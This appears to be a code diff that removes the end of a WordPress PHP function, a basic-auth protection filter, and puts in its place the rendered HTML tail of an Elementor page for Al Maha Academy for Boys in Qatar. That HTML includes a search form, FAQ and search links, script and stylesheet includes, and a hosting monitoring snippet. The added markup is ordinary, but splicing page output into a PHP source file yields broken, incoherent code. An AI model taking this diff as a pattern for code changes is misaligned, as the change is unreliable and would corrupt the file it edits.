-	return apply_filters( 'wp_is_site_protected_by_basic_auth', $is_protected, $context );
-}
+					
+					<input id="elementor-search-form-de7e2d7" placeholder="Search" class="elementor-search-form__input" type="search" name="s" value="">
+					
+											<button class="elementor-search-form__submit" type="submit" aria-label="Search">
+															<div class="e-font-icon-svg-container"><svg class="vamtamtheme- vamtam-theme-search e-font-icon-svg e-fas-search" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"></path></svg></div>								<span class="elementor-screen-only">Search</span>
+													</button>
+					
+									</div>
+			</form>
+		</search>
+						</div>
+				</div>
+					</div>
+		</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-a0f9985 elementor-hidden-desktop elementor-hidden-tablet elementor-hidden-mobile elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="a0f9985" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+						<div class="elementor-container elementor-column-gap-default">
+					<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-59c60b6" data-id="59c60b6" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-9738c2d elementor-widget elementor-widget-heading" data-id="9738c2d" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h4 class="elementor-heading-title elementor-size-default">FAQ</h4>				</div>
+				</div>
+				<div class="elementor-element elementor-element-21c04bd elementor-align-left elementor-widget elementor-widget-button" data-id="21c04bd" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-sm" href="/faq">
+						<span class="elementor-button-content-wrapper">
+									<span class="elementor-button-text">How to apply?</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+				<div class="elementor-element elementor-element-d278cec elementor-widget-divider--view-line elementor-widget elementor-widget-divider" data-id="d278cec" data-element_type="widget" data-widget_type="divider.default">
+				<div class="elementor-widget-container">
+							<div class="elementor-divider">
+			<span class="elementor-divider-separator">
+						</span>
+		</div>
+						</div>
+				</div>
+				<div class="elementor-element elementor-element-5411a34 elementor-align-left elementor-widget elementor-widget-button" data-id="5411a34" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-sm" href="/faq">
+						<span class="elementor-button-content-wrapper">
+									<span class="elementor-button-text">How much does it cost?</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+				<div class="elementor-element elementor-element-9e99b03 elementor-widget-divider--view-line elementor-widget elementor-widget-divider" data-id="9e99b03" data-element_type="widget" data-widget_type="divider.default">
+				<div class="elementor-widget-container">
+							<div class="elementor-divider">
+			<span class="elementor-divider-separator">
+						</span>
+		</div>
+						</div>
+				</div>
+				<div class="elementor-element elementor-element-f1aac67 elementor-align-left elementor-widget elementor-widget-button" data-id="f1aac67" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-sm" href="/faq">
+						<span class="elementor-button-content-wrapper">
+									<span class="elementor-button-text">Where is it?</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+				<div class="elementor-element elementor-element-ca060f4 elementor-widget-divider--view-line elementor-widget elementor-widget-divider" data-id="ca060f4" data-element_type="widget" data-widget_type="divider.default">
+				<div class="elementor-widget-container">
+							<div class="elementor-divider">
+			<span class="elementor-divider-separator">
+						</span>
+		</div>
+						</div>
+				</div>
+				<div class="elementor-element elementor-element-da5d9dc elementor-align-left elementor-widget elementor-widget-button" data-id="da5d9dc" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-sm" href="/faq">
+						<span class="elementor-button-content-wrapper">
+									<span class="elementor-button-text">What is the Academic Calendar?</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-06d98a2" data-id="06d98a2" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-d71aba1 elementor-widget elementor-widget-heading" data-id="d71aba1" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h4 class="elementor-heading-title elementor-size-default">Top Searches:</h4>				</div>
+				</div>
+				<div class="elementor-element elementor-element-4f35273 elementor-align-left elementor-widget elementor-widget-button" data-id="4f35273" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-sm" href="https://estudiar.vamtam.com/?s=campus">
+						<span class="elementor-button-content-wrapper">
+									<span class="elementor-button-text">Campus</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+				<div class="elementor-element elementor-element-96e8821 elementor-widget-divider--view-line elementor-widget elementor-widget-divider" data-id="96e8821" data-element_type="widget" data-widget_type="divider.default">
+				<div class="elementor-widget-container">
+							<div class="elementor-divider">
+			<span class="elementor-divider-separator">
+						</span>
+		</div>
+						</div>
+				</div>
+				<div class="elementor-element elementor-element-1a680f8 elementor-align-left elementor-widget elementor-widget-button" data-id="1a680f8" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-sm" href="https://estudiar.vamtam.com/?s=tuition-fees">
+						<span class="elementor-button-content-wrapper">
+									<span class="elementor-button-text">Tuition Fees</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+				<div class="elementor-element elementor-element-b635687 elementor-widget-divider--view-line elementor-widget elementor-widget-divider" data-id="b635687" data-element_type="widget" data-widget_type="divider.default">
+				<div class="elementor-widget-container">
+							<div class="elementor-divider">
+			<span class="elementor-divider-separator">
+						</span>
+		</div>
+						</div>
+				</div>
+				<div class="elementor-element elementor-element-13bf457 elementor-align-left elementor-widget elementor-widget-button" data-id="13bf457" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-sm" href="https://estudiar.vamtam.com/?s=scholarships">
+						<span class="elementor-button-content-wrapper">
+									<span class="elementor-button-text">Scholarships</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+				<div class="elementor-element elementor-element-ebeab29 elementor-widget-divider--view-line elementor-widget elementor-widget-divider" data-id="ebeab29" data-element_type="widget" data-widget_type="divider.default">
+				<div class="elementor-widget-container">
+							<div class="elementor-divider">
+			<span class="elementor-divider-separator">
+						</span>
+		</div>
+						</div>
+				</div>
+				<div class="elementor-element elementor-element-a3f798b elementor-align-left elementor-widget elementor-widget-button" data-id="a3f798b" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-sm" href="https://estudiar.vamtam.com/?s=application">
+						<span class="elementor-button-content-wrapper">
+									<span class="elementor-button-text">Application</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-739d607" data-id="739d607" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-01d57ba elementor-align-left elementor-widget elementor-widget-button" data-id="01d57ba" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-sm" href="https://estudiar.vamtam.com/?s=schedule">
+						<span class="elementor-button-content-wrapper">
+									<span class="elementor-button-text">Schedule</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+				<div class="elementor-element elementor-element-2b2234b elementor-widget-divider--view-line elementor-widget elementor-widget-divider" data-id="2b2234b" data-element_type="widget" data-widget_type="divider.default">
+				<div class="elementor-widget-container">
+							<div class="elementor-divider">
+			<span class="elementor-divider-separator">
+						</span>
+		</div>
+						</div>
+				</div>
+				<div class="elementor-element elementor-element-cc5879c elementor-align-left elementor-widget elementor-widget-button" data-id="cc5879c" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-sm" href="https://estudiar.vamtam.com/?s=sports">
+						<span class="elementor-button-content-wrapper">
+									<span class="elementor-button-text">Sports</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+				<div class="elementor-element elementor-element-c4a0784 elementor-widget-divider--view-line elementor-widget elementor-widget-divider" data-id="c4a0784" data-element_type="widget" data-widget_type="divider.default">
+				<div class="elementor-widget-container">
+							<div class="elementor-divider">
+			<span class="elementor-divider-separator">
+						</span>
+		</div>
+						</div>
+				</div>
+				<div class="elementor-element elementor-element-1ab65e2 elementor-align-left elementor-widget elementor-widget-button" data-id="1ab65e2" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-sm" href="https://estudiar.vamtam.com/?s=graduate">
+						<span class="elementor-button-content-wrapper">
+									<span class="elementor-button-text">Graduate</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+				<div class="elementor-element elementor-element-f599c45 elementor-widget-divider--view-line elementor-widget elementor-widget-divider" data-id="f599c45" data-element_type="widget" data-widget_type="divider.default">
+				<div class="elementor-widget-container">
+							<div class="elementor-divider">
+			<span class="elementor-divider-separator">
+						</span>
+		</div>
+						</div>
+				</div>
+				<div class="elementor-element elementor-element-09c0f5c elementor-align-left elementor-widget elementor-widget-button" data-id="09c0f5c" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-sm" href="https://estudiar.vamtam.com/?s=programs">
+						<span class="elementor-button-content-wrapper">
+									<span class="elementor-button-text">Programs</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+					</div>
+		</div>
+					</div>
+		</section>
+				</div>
+					<script type='text/javascript'>
+				const lazyloadRunObserver = () => {
+					const lazyloadBackgrounds = document.querySelectorAll( `.e-con.e-parent:not(.e-lazyloaded)` );
+					const lazyloadBackgroundObserver = new IntersectionObserver( ( entries ) => {
+						entries.forEach( ( entry ) => {
+							if ( entry.isIntersecting ) {
+								let lazyloadBackground = entry.target;
+								if( lazyloadBackground ) {
+									lazyloadBackground.classList.add( 'e-lazyloaded' );
+								}
+								lazyloadBackgroundObserver.unobserve( entry.target );
+							}
+						});
+					}, { rootMargin: '200px 0px 200px 0px' } );
+					lazyloadBackgrounds.forEach( ( lazyloadBackground ) => {
+						lazyloadBackgroundObserver.observe( lazyloadBackground );
+					} );
+				};
+				const events = [
+					'DOMContentLoaded',
+					'elementor/lazyload/observe',
+				];
+				events.forEach( ( event ) => {
+					document.addEventListener( event, lazyloadRunObserver );
+				} );
+			</script>
+			<link rel='stylesheet' id='widget-image-css' href='https://amab.com.qa/wp-content/plugins/elementor/assets/css/widget-image.min.css?ver=3.26.4' type='text/css' media='all' />
+<link rel='stylesheet' id='widget-heading-css' href='https://amab.com.qa/wp-content/plugins/elementor/assets/css/widget-heading.min.css?ver=3.26.4' type='text/css' media='all' />
+<link rel='stylesheet' id='e-animation-shrink-css' href='https://amab.com.qa/wp-content/plugins/elementor/assets/lib/animations/styles/e-animation-shrink.min.css?ver=3.26.4' type='text/css' media='all' />
+<link rel='stylesheet' id='e-animation-fadeInUp-css' href='https://amab.com.qa/wp-content/plugins/elementor/assets/lib/animations/styles/fadeInUp.min.css?ver=3.26.4' type='text/css' media='all' />
+<link rel='stylesheet' id='widget-social-icons-css' href='https://amab.com.qa/wp-content/plugins/elementor/assets/css/widget-social-icons.min.css?ver=3.26.4' type='text/css' media='all' />
+<link rel='stylesheet' id='e-apple-webkit-css' href='https://amab.com.qa/wp-content/uploads/elementor/css/custom-apple-webkit.min.css?ver=1737042462' type='text/css' media='all' />
+<link rel='stylesheet' id='e-animation-fadeIn-css' href='https://amab.com.qa/wp-content/plugins/elementor/assets/lib/animations/styles/fadeIn.min.css?ver=3.26.4' type='text/css' media='all' />
+<link rel='stylesheet' id='elementor-post-998-css' href='https://amab.com.qa/wp-content/uploads/elementor/css/post-998.css?ver=1756108418' type='text/css' media='all' />
+<link rel='stylesheet' id='widget-divider-css' href='https://amab.com.qa/wp-content/plugins/elementor/assets/css/widget-divider.min.css?ver=3.26.4' type='text/css' media='all' />
+<link rel='stylesheet' id='widget-icon-box-css' href='https://amab.com.qa/wp-content/uploads/elementor/css/custom-widget-icon-box.min.css?ver=1737042462' type='text/css' media='all' />
+<link rel='stylesheet' id='e-animation-slideInDown-css' href='https://amab.com.qa/wp-content/plugins/elementor/assets/lib/animations/styles/slideInDown.min.css?ver=3.26.4' type='text/css' media='all' />
+<link rel='stylesheet' id='elementor-post-7592-css' href='https://amab.com.qa/wp-content/uploads/elementor/css/post-7592.css?ver=1737042464' type='text/css' media='all' />
+<script type="text/javascript" id="vamtam-all-js-extra">
+/* <![CDATA[ */
+var VAMTAM_FRONT = {"ajaxurl":"https:\/\/amab.com.qa\/wp-admin\/admin-ajax.php","jspath":"https:\/\/amab.com.qa\/wp-content\/themes\/estudiar\/vamtam\/assets\/js\/","max_breakpoint":"1025","beaver_responsive":"1025","beaver_small":"430","content_width":"1260","enable_ajax_add_to_cart":""};
+/* ]]> */
+</script>
+<script type="text/javascript" src="https://amab.com.qa/wp-content/themes/estudiar/vamtam/assets/js/all.js?ver=1729494426" id="vamtam-all-js"></script>
+<script type="text/javascript" id="vamtam-all-js-after">
+/* <![CDATA[ */
+VAMTAM_FRONT.theme_supports = (feature) => ["nav-menu--disable-scroll-on-mobile","slides--force-slide-stretch","slides--arrows-position-overlap","slides--arrows-responsive-size","slides--arrows-color-tabs","slides--arrows-color-tabs__hover-anim","tabs--estudiar-hr-tabs-style","nav-menu--line-through-pointer","nav-menu--prefix-pointer","nav-menu--custom-dropdown-divider","icon-box--box-is-link","image-box--box-is-link","form--prefix-grow-hover-anims","button--underline-animation","button--estudiar-underline-animation","button--icon-size-control","button--hover-text-decoration","button--icon-colors","woocommerce-menu-cart--close-cart-theme-icon","woocommerce-product-images--disable-image-link","image--grow-with-scale-anims","animated-headline--blurred-letters","posts.classic--content-hover-color","posts.classic--estudiar-read-more-style","testimonial-carousel--estudiar-slider-arrows","testimonial-carousel--disable-slide-to-click","accordion--estudiar-border-style","call-to-action--estudiar-cta-style","call-to-action--graphic-element-hover-color","archive-posts.classic--box-section","search-form--estudiar-form-style","site-settings--theme-settings","nav-menu--toggle-sticky-hover-state-on-touch-fix","nav-menu--mobile-menu-overlay","column--logical-spacings"].includes(feature);
+/* ]]> */
+</script>
+<script type="module" src="https://amab.com.qa/wp-content/plugins/elementor-pro/assets//lib/instant-page/instant-page.min.js?ver=3.20.3" id="instant-page-js"></script>
+<script type="text/javascript" src="https://amab.com.qa/wp-includes/js/imagesloaded.min.js?ver=5.0.0" id="imagesloaded-js"></script>
+<script type="text/javascript" src="https://amab.com.qa/wp-content/plugins/elementor/assets/js/webpack.runtime.min.js?ver=3.26.4" id="elementor-webpack-runtime-js"></script>
+<script type="text/javascript" src="https://amab.com.qa/wp-content/plugins/elementor/assets/js/frontend-modules.min.js?ver=3.26.4" id="elementor-frontend-modules-js"></script>
+<script type="text/javascript" src="https://amab.com.qa/wp-includes/js/jquery/ui/core.min.js?ver=1.13.3" id="jquery-ui-core-js"></script>
+<script type="text/javascript" id="elementor-frontend-js-before">
+/* <![CDATA[ */
+var elementorFrontendConfig = {"environmentMode":{"edit":false,"wpPreview":false,"isScriptDebug":false},"i18n":{"shareOnFacebook":"Share on Facebook","shareOnTwitter":"Share on Twitter","pinIt":"Pin it","download":"Download","downloadImage":"Download image","fullscreen":"Fullscreen","zoom":"Zoom","share":"Share","playVideo":"Play Video","previous":"Previous","next":"Next","close":"Close","a11yCarouselPrevSlideMessage":"Previous slide","a11yCarouselNextSlideMessage":"Next slide","a11yCarouselFirstSlideMessage":"This is the first slide","a11yCarouselLastSlideMessage":"This is the last slide","a11yCarouselPaginationBulletMessage":"Go to slide"},"is_rtl":false,"breakpoints":{"xs":0,"sm":480,"md":431,"lg":1025,"xl":1440,"xxl":1600},"responsive":{"breakpoints":{"mobile":{"label":"Mobile Portrait","value":430,"default_value":767,"direction":"max","is_enabled":true},"mobile_extra":{"label":"Mobile Landscape","value":880,"default_value":880,"direction":"max","is_enabled":false},"tablet":{"label":"Tablet Portrait","value":1024,"default_value":1024,"direction":"max","is_enabled":true},"tablet_extra":{"label":"Tablet Landscape","value":1200,"default_value":1200,"direction":"max","is_enabled":false},"laptop":{"label":"Laptop","value":1366,"default_value":1366,"direction":"max","is_enabled":false},"widescreen":{"label":"Widescreen","value":2400,"default_value":2400,"direction":"min","is_enabled":false}},"hasCustomBreakpoints":true},"version":"3.26.4","is_static":false,"experimentalFeatures":{"e_font_icon_svg":true,"container":true,"e_swiper_latest":true,"e_css_smooth_scroll":true,"theme_builder_v2":true,"editor_v2":true,"link-in-bio":true,"floating-buttons":true,"notes":true,"display-conditions":true,"form-submissions":true,"taxonomy-filter":true},"urls":{"assets":"https:\/\/amab.com.qa\/wp-content\/plugins\/elementor\/assets\/","ajaxurl":"https:\/\/amab.com.qa\/wp-admin\/admin-ajax.php","uploadUrl":"https:\/\/amab.com.qa\/wp-content\/uploads"},"nonces":{"floatingButtonsClickTracking":"e54d4fe117"},"swiperClass":"swiper","settings":{"page":[],"editorPreferences":[]},"kit":{"body_background_background":"classic","viewport_tablet":1024,"viewport_mobile":430,"active_breakpoints":["viewport_mobile","viewport_tablet"],"global_image_lightbox":"yes","lightbox_enable_counter":"yes","lightbox_enable_fullscreen":"yes","lightbox_enable_zoom":"yes","lightbox_enable_share":"yes","lightbox_title_src":"title","lightbox_description_src":"description","vamtam_theme_has_theme_cursor":"yes"},"post":{"id":992016,"title":"News%20and%20Events%20%E2%80%93%20AMAB%20%E2%80%93%20Al%20Maha%20Academy%20for%20Boys%20%7C%20Taallum%20Group%20Doha%20Qatar%20-%D8%A3%D9%83%D8%A7%D8%AF%D9%8A%D9%85%D9%8A%D9%91%D8%A9%20%D8%A7%D9%84%D9%85%D9%87%D8%A7%20%D9%84%D9%84%D8%A8%D9%86%D9%8A%D9%86","excerpt":"","featuredImage":false}};
+/* ]]> */
+</script>
+<script type="text/javascript" src="https://amab.com.qa/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=3.26.4" id="elementor-frontend-js"></script>
+<script type="text/javascript" src="https://amab.com.qa/wp-content/plugins/vamtam-elementor-integration/assets/js/widgets/text-editor/vamtam-text-editor.min.js?ver=1.0.39" id="vamtam-text-editor-js"></script>
+<script type="text/javascript" src="https://amab.com.qa/wp-content/plugins/page-links-to/dist/new-tab.js?ver=3.3.7" id="page-links-to-js"></script>
+<script type="text/javascript" src="https://amab.com.qa/wp-content/plugins/elementor-pro/assets/lib/smartmenus/jquery.smartmenus.min.js?ver=1.2.1" id="smartmenus-js"></script>
+<script type="text/javascript" src="https://amab.com.qa/wp-content/plugins/vamtam-elementor-integration/assets/js/widgets/nav-menu/vamtam-nav-menu.min.js?ver=1.0.39" id="vamtam-nav-menu-js"></script>
+<script type="text/javascript" src="https://amab.com.qa/wp-content/plugins/vamtam-elementor-integration/assets/js/widgets/image/vamtam-image.min.js?ver=1.0.39" id="vamtam-image-js"></script>
+<script type="text/javascript" src="https://amab.com.qa/wp-content/plugins/elementor-pro/assets/js/webpack-pro.runtime.min.js?ver=3.20.3" id="elementor-pro-webpack-runtime-js"></script>
+<script type="text/javascript" src="https://amab.com.qa/wp-includes/js/dist/hooks.min.js?ver=4d63a3d491d11ffd8ac6" id="wp-hooks-js"></script>
+<script type="text/javascript" src="https://amab.com.qa/wp-includes/js/dist/i18n.min.js?ver=5e580eb46a90c2b997e6" id="wp-i18n-js"></script>
+<script type="text/javascript" id="wp-i18n-js-after">
+/* <![CDATA[ */
+wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
+/* ]]> */
+</script>
+<script type="text/javascript" id="elementor-pro-frontend-js-before">
+/* <![CDATA[ */
+var ElementorProFrontendConfig = {"ajaxurl":"https:\/\/amab.com.qa\/wp-admin\/admin-ajax.php","nonce":"2e05cfe5b8","urls":{"assets":"https:\/\/amab.com.qa\/wp-content\/plugins\/elementor-pro\/assets\/","rest":"https:\/\/amab.com.qa\/wp-json\/"},"shareButtonsNetworks":{"facebook":{"title":"Facebook","has_counter":true},"twitter":{"title":"Twitter"},"linkedin":{"title":"LinkedIn","has_counter":true},"pinterest":{"title":"Pinterest","has_counter":true},"reddit":{"title":"Reddit","has_counter":true},"vk":{"title":"VK","has_counter":true},"odnoklassniki":{"title":"OK","has_counter":true},"tumblr":{"title":"Tumblr"},"digg":{"title":"Digg"},"skype":{"title":"Skype"},"stumbleupon":{"title":"StumbleUpon","has_counter":true},"mix":{"title":"Mix"},"telegram":{"title":"Telegram"},"pocket":{"title":"Pocket","has_counter":true},"xing":{"title":"XING","has_counter":true},"whatsapp":{"title":"WhatsApp"},"email":{"title":"Email"},"print":{"title":"Print"}},"facebook_sdk":{"lang":"en_US","app_id":""},"lottie":{"defaultAnimationUrl":"https:\/\/amab.com.qa\/wp-content\/plugins\/elementor-pro\/modules\/lottie\/assets\/animations\/default.json"}};
+/* ]]> */
+</script>
+<script type="text/javascript" src="https://amab.com.qa/wp-content/plugins/elementor-pro/assets/js/frontend.min.js?ver=3.20.3" id="elementor-pro-frontend-js"></script>
+<script type="text/javascript" src="https://amab.com.qa/wp-content/plugins/elementor-pro/assets/js/preloaded-elements-handlers.min.js?ver=3.20.3" id="pro-preloaded-elements-handlers-js"></script>
+<script type="text/javascript" src="https://amab.com.qa/wp-content/plugins/vamtam-elementor-integration/assets/js/vamtam-elementor-frontend.min.js?ver=1.0.39" id="vamtam-elementor-frontend-js"></script>
+<script type="text/javascript" src="https://amab.com.qa/wp-content/plugins/elementor-pro/assets/lib/sticky/jquery.sticky.min.js?ver=3.20.3" id="e-sticky-js"></script>
+</body>
+<script>'undefined'=== typeof _trfq || (window._trfq = []);'undefined'=== typeof _trfd && (window._trfd=[]),_trfd.push({'tccl.baseHost':'secureserver.net'},{'ap':'cpsh-oh'},{'server':'p3plzcpnl489531'},{'dcenter':'p3'},{'cp_id':'10105027'},{'cp_cl':'8'}) // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.</script><script src='https://img1.wsimg.com/traffic-assets/js/tccl.min.js'></script></html>
